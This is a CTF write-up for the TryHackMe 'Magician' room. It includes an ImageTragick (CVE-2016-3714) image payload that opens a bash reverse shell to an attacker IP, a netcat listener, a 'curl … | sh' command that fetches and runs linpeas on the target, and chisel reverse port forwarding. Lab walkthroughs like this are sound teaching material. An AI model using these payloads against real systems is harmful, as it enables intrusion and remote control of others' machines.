---
title: TryHackMe - Magician
layout: post
categories:
- TryHackMe
tag: CVE-2016-3714
image: "/assets/img/magician.png"
image_alt: magician
---

This magical website lets you convert image file formats. Let's start.

<br>

## 1. Find the flags!   

Note: this machine needs about 7 minutes to start up, please be patient :)

Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.

Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)

Have fun and use your magic skills!

<br>

### 1.1 user.txt

Let’s first add the hostname to our /etc/hosts file, as told above.

![hosts](/assets/img/tryhackme/magician/hosts.png)

Let's do a nmap scan.

```
$ nmap -sSV magician
```

![nmap](/assets/img/tryhackme/magician/nmap.png)

Three ports are open. These are **`21/tcp HTTP, 8080/tcp SSH, and 8081/tcp HTTP`**. 

First, I tried to see if I could login to the FTP server anonymously.

![ftp](/assets/img/tryhackme/magician/ftp.png)

I found an important clue here. 
This is what I came across when I visited this site: [https://imagetragick.com](https://imagetragick.com). 

![hint](/assets/img/tryhackme/magician/hint.png)

We will exploit a vulnerability using **`CVE-2016–3714`**.

Now let's check the websites running on other ports.

First I examine the site running on port 8080. 

![8080](/assets/img/tryhackme/magician/8080.png)

I couldn't find anything remarkable.

Now let's examine the site running on port 8081.

![home](/assets/img/tryhackme/magician/home.png)

As far as I can see, I can only upload images. Let's create a reverse shell by taking advantage of the CVE-2016–3714 vulnerability we found.

![image](/assets/img/tryhackme/magician/image.png)

```
$ cat > image.png << EOF
  push graphic-context
  encoding "UTF-8"
  viewbox 0 0 1 1
  affine 1 0 0 1 0 0 
  push graphic-context
  image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.86.168/4444 0<&1 2>&1'
  pop graphic-context
  pop graphic-context
  EOF
```

Now let's set up a netcat listener on our machine.

```
$ nc -nlvp 4444
```

Now we can upload it to the site.

![in](/assets/img/tryhackme/magician/in.png)

And we are inside.

Let's get the user flag.

![user-flag](/assets/img/tryhackme/magician/user-flag.png)


### 1.2 root.txt

Now we need root privilege. So let's download linepeas.sh and run it.

I'm downloading [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20230319) on my own machine. 

Let's run the following code in the directory where linpeas.sh is located.

```
$ python -m http.server 80
```

Then let's run the following code on the target machine.

```
$ curl 10.8.86.168/linpeas.sh | sh
```

And it worked. Let's see what we can find.

I found this.

![linpeas](/assets/img/tryhackme/magician/linpeas.png)

There is something running on port 6666. To achieve this, we need to do port forwarding.

First, let's download the [chisel](https://github.com/jpillora/chisel/releases) to our own machine and send it to the target machine. 

```
$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_arm64.gz
$ gunzip chisel_1.8.1_linux_arm64.gz  
$ mv chisel_1.8.1_linux_arm64 chisel
$ python -m http.server 80
```

![chisel](/assets/img/tryhackme/magician/chisel.png)

On the target machine, we run the following codes.

```
$ wget http://10.8.86.168/chisel
$ chmod +x chisel
$ ./chisel client 10.8.86.168:5555 R:5554:127.0.0.1:6666
```

![chisel-target](/assets/img/tryhackme/magician/chisel-target.png)

Then ı return to my own machine and run the following codes.

```
$ sudo apt-get install chisel
$ chisel server --reverse --port 5555
```

![chisel-own](/assets/img/tryhackme/magician/chisel-own.png)

Now we can look at the site running on the port we forwarded. [http://0.0.0.0:5554](http://0.0.0.0:5554)

![run](/assets/img/tryhackme/magician/run.png)

We are looking for /root/root.txt. Press the Submit button until the base64 code is displayed.

![encode](/assets/img/tryhackme/magician/encode.png)

Let's crack it.

![decode](/assets/img/tryhackme/magician/decode.png)

<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
